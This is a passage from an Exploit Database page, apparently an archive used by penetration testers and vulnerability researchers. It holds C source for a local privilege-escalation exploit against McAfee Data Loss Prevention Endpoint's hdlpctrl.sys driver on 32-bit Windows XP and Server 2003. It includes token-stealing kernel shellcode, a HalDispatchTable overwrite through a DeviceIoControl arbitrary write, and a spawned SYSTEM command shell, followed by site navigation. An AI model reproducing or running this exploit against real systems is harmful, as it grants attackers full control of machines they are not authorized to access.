  0x8b,0x98,XP_TOKEN,0x00,0x00,0x00,                     // mov ebx, [eax+XP_TOKEN]        Retrieves TOKEN
  0x8b,0x80,XP_APLINKS,0x00,0x00,0x00,                   // mov eax, [eax+XP_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
  0x81,0xe8,XP_APLINKS,0x00,0x00,0x00,                   // sub eax, XP_APLINKS         |  Retrieve _EPROCESS Pointer from the ActiveProcessLinks
  0x81,0xb8,XP_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,  // cmp [eax+XP_UPID], 4        |  Compares UniqueProcessId with 4 (System Process)
  0x75,0xe8,                                             // jne                     ----
  0x8b,0x90,XP_TOKEN,0x00,0x00,0x00,                     // mov edx, [eax+XP_TOKEN]        Retrieves TOKEN and stores on EDX
  0x8b,0xc1,                                             // mov eax, ecx                   Retrieves KPROCESS stored on ECX
  0x89,0x90,XP_TOKEN,0x00,0x00,0x00,                     // mov [eax+XP_TOKEN], edx        Overwrites the TOKEN for the current KPROCESS
  0x5b,                                                  // pop ebx                        Restores ebx
  0x5a,                                                  // pop edx                        Restores edx
  0xc2,0x08                                              // ret 8
};

BYTE token_steal_w2k3[] =
{
  0x52,                                                  // push edx                         Save edx on the stack
  0x53,                                                  // push ebx                         Save ebx on the stack
  0x33,0xc0,                                             // xor eax, eax                     eax = 0
  0x64,0x8b,0x80,0x24,0x01,0x00,0x00,                    // mov eax, fs:[eax+124h]           Retrieve ETHREAD
  0x8b,0x40,W2K3_KPROCESS,                               // mov eax, [eax+W2K3_KPROCESS]     Retrieve _KPROCESS
  0x8b,0xc8,                                             // mov ecx, eax
  0x8b,0x98,W2K3_TOKEN,0x00,0x00,0x00,                   // mov ebx, [eax+W2K3_TOKEN]        Retrieves TOKEN
  0x8b,0x80,W2K3_APLINKS,0x00,0x00,0x00,                 // mov eax, [eax+W2K3_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
  0x81,0xe8,W2K3_APLINKS,0x00,0x00,0x00,                 // sub eax, W2K3_APLINKS         |  Retrieve _EPROCESS Pointer from the ActiveProcessLinks
  0x81,0xb8,W2K3_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,// cmp [eax+W2K3_UPID], 4        |  Compares UniqueProcessId with 4 (System Process)
  0x75,0xe8,                                             // jne                       ----
  0x8b,0x90,W2K3_TOKEN,0x00,0x00,0x00,                   // mov edx, [eax+W2K3_TOKEN]        Retrieves TOKEN and stores on EDX
  0x8b,0xc1,                                             // mov eax, ecx                     Retrieves KPROCESS stored on ECX
  0x89,0x90,W2K3_TOKEN,0x00,0x00,0x00,                   // mov [eax+W2K3_TOKEN], edx        Overwrites the TOKEN for the current KPROCESS
  0x5b,                                                  // pop ebx                          Restores ebx
  0x5a,                                                  // pop edx                          Restores edx
  0xc2,0x08                                              // ret 8                            Away from the kernel
};

DWORD HalDispatchTableAddress()
{
    _NtQuerySystemInformation    NtQuerySystemInformation;
    PSYSTEM_MODULE_INFORMATION   pModuleInfo;
    DWORD                        HalDispatchTable;
    CHAR                         kFullName[256];
    PVOID                        kBase = NULL;
    LPSTR                        kName;
    HMODULE                      Kernel;
    FUNCTPTR                     Hal;
    ULONG                        len;
    NTSTATUS                     status;

    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation)
    {
        printf("[-] Unable to resolve NtQuerySystemInformation\n\n");
        return -1;
    }

    status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

    if (!status)
    {
        printf("[-] An error occured while reading NtQuerySystemInformation. Status = 0x%08x\n\n", status);
        return -1;
    }

    pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);

    if(pModuleInfo == NULL)
    {
        printf("[-] An error occurred with GlobalAlloc for pModuleInfo\n\n");
        return -1;
    }

    status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);

    memset(kFullName, 0x00, sizeof(kFullName));
    strcpy_s(kFullName, sizeof(kFullName)-1, pModuleInfo->Module[0].ImageName);
    kBase = pModuleInfo->Module[0].Base;

    printf("[i] Kernel base name %s\n", kFullName);
    kName = strrchr(kFullName, '\\');

    Kernel = LoadLibraryA(++kName);

    if(Kernel == NULL)
    {
        printf("[-] Failed to load kernel base\n\n");
        return -1;
    }

    Hal = (FUNCTPTR)GetProcAddress(Kernel, "HalDispatchTable");

    if(Hal == NULL)
    {
        printf("[-] Failed to find HalDispatchTable\n\n");
        return -1;
    }

    printf("[i] HalDispatchTable address 0x%08x\n", Hal);
    printf("[i] Kernel handle 0x%08x\n", Kernel);
    printf("[i] Kernel base address 0x%08x\n", kBase);

    HalDispatchTable = ((DWORD)Hal - (DWORD)Kernel + (DWORD)kBase);

    printf("[+] Kernel address of HalDispatchTable 0x%08x\n", HalDispatchTable);

    if(!HalDispatchTable)
    {
        printf("[-] Failed to calculate HalDispatchTable\n\n");
        return -1;
    }

    return HalDispatchTable;
}

int GetWindowsVersion()
{
    int v = 0;
    DWORD version = 0, minVersion = 0, majVersion = 0;

    version = GetVersion();

    minVersion = (DWORD)(HIBYTE(LOWORD(version)));
    majVersion = (DWORD)(LOBYTE(LOWORD(version)));

    if (minVersion == 1 && majVersion == 5) v = 1;  // "Windows XP;
    if (minVersion == 1 && majVersion == 6) v = 2;  // "Windows 7";
    if (minVersion == 2 && majVersion == 5) v = 3;  // "Windows Server 2003;

    return v;
}

void spawnShell()
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("\n[-] CreateProcess failed (%d)\n\n", GetLastError());
        return;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

int main(int argc, char *argv[])
{

    _NtQueryIntervalProfile     NtQueryIntervalProfile;
    LPVOID                      input[1] = {0};
    LPVOID                      addrtoshell;
    HANDLE                      hDevice;
    DWORD                       dwRetBytes = 0;
    DWORD                       HalDispatchTableTarget;
    ULONG                       time = 0;
    unsigned char               devhandle[MAX_PATH];

    printf("-------------------------------------------------------------------------------\n");
    printf("McAfee Data Loss Prevention Endpoint (hdlpctrl.sys) Arbitrary Write EoP Exploit\n");
    printf("           Tested on Windows XP SP3/Windows Server 2003 SP2 (32bit)            \n");
    printf("-------------------------------------------------------------------------------\n\n");

    if (GetWindowsVersion() == 1)
    {
        printf("[i] Running Windows XP\n");
    }

    if (GetWindowsVersion() == 3)
    {
        printf("[i] Running Windows Server 2003\n");
    }

    if (GetWindowsVersion() == 0)
    {
        printf("[i] Exploit not supported on this OS\n\n");
        return -1;
    }

    sprintf(devhandle, "\\\\.\\%s", "devbkctrl");

    NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryIntervalProfile");

    if (!NtQueryIntervalProfile)
    {
        printf("[-] Unable to resolve NtQueryIntervalProfile\n\n");
        return -1;
    }

    addrtoshell = VirtualAlloc(NULL, BUFSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if(addrtoshell == NULL)
    {
        printf("[-] VirtualAlloc allocation failure %.8x\n\n", GetLastError());
        return -1;
    }
    printf("[+] VirtualAlloc allocated memory at 0x%.8x\n", addrtoshell);

    memset(addrtoshell, 0x90, BUFSIZE);

    if (GetWindowsVersion() == 1)
    {
        memcpy(addrtoshell, token_steal_xp, sizeof(token_steal_xp));
        printf("[i] Size of shellcode %d bytes\n", sizeof(token_steal_xp));
    }

    if (GetWindowsVersion() == 3)
    {
        memcpy(addrtoshell, token_steal_w2k3, sizeof(token_steal_w2k3));
        printf("[i] Size of shellcode %d bytes\n", sizeof(token_steal_w2k3));
    }

    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFile open %s device failed (%d)\n\n", devhandle, GetLastError());
        return -1;
    }
    else
    {
        printf("[+] Open %s device successful\n", devhandle);
    }

    HalDispatchTableTarget = HalDispatchTableAddress() + sizeof(DWORD);
    printf("[+] HalDispatchTable+4 (0x%08x) will be overwritten\n", HalDispatchTableTarget);

    input[0] = addrtoshell;  // input buffer contents gets written to our output buffer address

    printf("[+] Input buffer contents %08x\n", input[0]);

    printf("[~] Press any key to send Exploit  . . .\n");
    getch();

    DeviceIoControl(hDevice, 0x00224014, input, sizeof(input), (LPVOID)HalDispatchTableTarget, 0, &dwRetBytes, NULL);

    printf("[+] Buffer sent\n");
    CloseHandle(hDevice);

    printf("[+] Spawning SYSTEM Shell\n");
    NtQueryIntervalProfile(2, &time);
    spawnShell();

    return 0;
}

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


